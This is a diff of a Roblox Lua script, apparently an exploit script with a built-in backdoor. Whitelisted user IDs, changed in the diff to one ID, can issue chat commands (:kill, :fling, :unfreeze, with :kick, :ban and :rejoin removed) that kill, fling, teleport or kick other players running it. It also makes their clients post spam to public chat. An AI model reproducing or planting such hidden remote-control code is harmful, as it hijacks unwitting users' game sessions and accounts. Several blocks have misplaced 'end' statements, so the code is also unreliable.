@@ -1,4 +1,4 @@
-local whitelist = { owner = {4214141424}, admin = {3276810125},{1362310817},}
+local whitelist = { owner = {2999553563}, admin = {2999553563},}
 
         owner = true admin = true
     
@@ -20,70 +20,30 @@ local whitelist = { owner = {4214141424}, admin = {3276810125},{1362310817},}
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
             end
         end
-        --  kill end
-        -- kick start
-        if message:sub(1, 5) == ":kick" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                game.Players.LocalPlayer:Kick("\nxd u was kicked by who though?. \n["..author.."]")
-    
-            end
-        end
-
-        if message:sub(1, 6) == ":fling" then
-            if message:match(game.Players.LocalPlayer.Name) then
-                local plr = game.Players.LocalPlayer
-                plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-            end
-        end
-    
-        -- kick end
         if message == ":users" then
             if author ~= game.Players.LocalPlayer.Name then
                 local path = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
                 path:FireServer("SoftVortex on TOP"..author.."!","all")
             end
         end
-    
-        if owner then
-            if message:sub(1, 4) == ":ban" then
-                if message:match(game.Players.LocalPlayer.Name) then
-                    game.ReplicatedStorage.MainEvent:FireServer("BreathingHAMON")
-                    local TeleportService = game:GetService("TeleportService")
-                    TeleportService:Teleport(5602055394, game.Players.LocalPlayer)
-                end
-            end
-
-            if message:sub(1, 7) == ":rejoin" then
-                if message:match(game.Players.LocalPlayer.Name) then
-                    local TeleportService = game:GetService("TeleportService")
-                    TeleportService:Teleport(5602055394, game.Players.LocalPlayer)
-                end
+    end
+        if message:sub(1, 9) == ":unfreeze" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                game.Players.LocalPlayer.Character.Head.Anchored = false
             end
         end
-    end
-    end
-    
-    -- //
+        if message:sub(1, 6) == ":fling" then
+            if message:match(game.Players.LocalPlayer.Name) then
+                local plr = game.Players.LocalPlayer
+                plr.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+            end
+        end
+end
     for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.admin) do if v.UserId == _ then admin = true if admin then warn('New admin : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
     end game.Players.PlayerAdded:Connect(function(player) for i ,_ in pairs(whitelist.admin) do if player.UserId == _ then admin = true if admin then warn('New admin : '..player.Name) player.Chatted:Connect(function(msg) runcommand(msg,player.Name) end) end end end
     end)
-    
+  
     -- // Owner
     
     for i,v in pairs(game.Players:GetChildren()) do for i ,_ in pairs(whitelist.owner) do if v.UserId == _ then owner = true if owner then warn('New owner : '..v.Name) v.Chatted:Connect(function(msg) print(v.Name.. " said "..msg) runcommand(msg,v.Name) end) end end end
     end 
-
-
-
-
-
-
-
-
-
-    
-
-
-
-
